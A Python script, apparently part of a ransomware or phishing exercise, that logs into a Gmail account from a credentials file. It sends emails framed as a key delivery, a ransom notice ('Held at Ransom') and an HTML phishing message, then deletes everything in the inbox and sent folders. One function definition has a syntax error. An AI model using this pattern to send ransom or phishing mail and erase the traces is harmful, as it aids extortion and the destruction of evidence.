#Email script, reads in given email addr, password and imap/smap url.
#Sends email, waits, recieves email then deletes contents of inbox.

import imaplib, smtplib, email, time, json

user = ''
password = ''
imap_url = 'imap.gmail.com'
smtp_url = 'smtp.gmail.com'
part1a = ''
html1 = ''

with open('part1.txt', 'r') as part1c:
    part1b=part1c.read().replace('\n','')
    part1a=part1b

with open('Auth.json') as json_file:
    data = json.load(json_file)
    user = (data['Crypt'][0]['username'])
    password = (data['Crypt'][0]['password'])

with open('html1.txt') as string:
    sData = string.read().replace('\n','')
    html1=sData
    
###### sending email

def sendEmailKey():

    import os, smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders

    os.system("")

    email_user = ''
    email_pass = ''
    email_send = user
    subject = 'First Email'

    msg = MIMEMultipart()
    msg['From'] = user
    msg['To'] = email_send
    msg['Subject'] = subject

    body = part1a
    msg.attach(MIMEText(body, 'plain'))

    filename = 'innocent_file.txt'
    attachment = open(filename, 'rb')

    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('content-disposition',"attachement; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(user,password)
    
    server.sendmail(user,email_send,text)

    
##    content = 'Subject: Keeper of Keys \n\n This is the first email'
##
##    mail = smtplib.SMTP(smtp_url, 587)
##
##    mail.ehlo()
##
##    mail.starttls()
##
##    mail.login(user,password)
##
##    mail.sendmail(user, user, content)

def sendEmailRans():

    content = 'Subject: Held at Ransom \n\n This is the third email'

    mail = smtplib.SMTP(smtp_url, 587)

    mail.ehlo()

    mail.starttls()

    mail.login(user,password)

    mail.sendmail(user, user, content)

def SendEmailPhish():
    from email.message import EmailMessage

    email_user = ''
    email_pass = ''
    email_send = user
    subject = 'First Email'

    msg = EmailMessage()
    msg['From'] = user
    msg['To'] = email_send
    msg['Subject'] = subject
    msg.set_content('see attach')

    msg.add_alternative(html1, subtype='html')

    

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(user, password)
        smtp.send_message(msg)

def SendEmailKeys:
    from email.message import EmailMessage

    email_user = ''
    email_pass = ''
    email_send = user
    subject = 'First Email'

    msg = EmailMessage()
    msg['From'] = user
    msg['To'] = email_send
    msg['Subject'] = subject

    with open('innocent_file.txt', 'rb') as f:
        file_data = f.read()
        file_name = f.name

    msg.add_attachment(file_data, maintype='text', subtype='octet-stream', filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(user, password)
        smtp.send_message(msg)
    
###### delete files
def deleteEmailInbox():
    con = imaplib.IMAP4_SSL(imap_url)
    con.login(user,password)
    con.select('INBOX')
    typ, data = con.search(None, 'ALL')
    for num in data[0].split():
        con.store(num, '+FLAGS', '\\Deleted')
    con.expunge()
    con.close()
def deleteEmailSent():
    con = imaplib.IMAP4_SSL(imap_url)
    con.login(user,password)
    con.select('SENT')
    typ, data = con.search(None, 'ALL')
    for num in data[0].split():
        con.store(num, '+FLAGS', '\\Deleted')
    con.expunge()
    con.close()


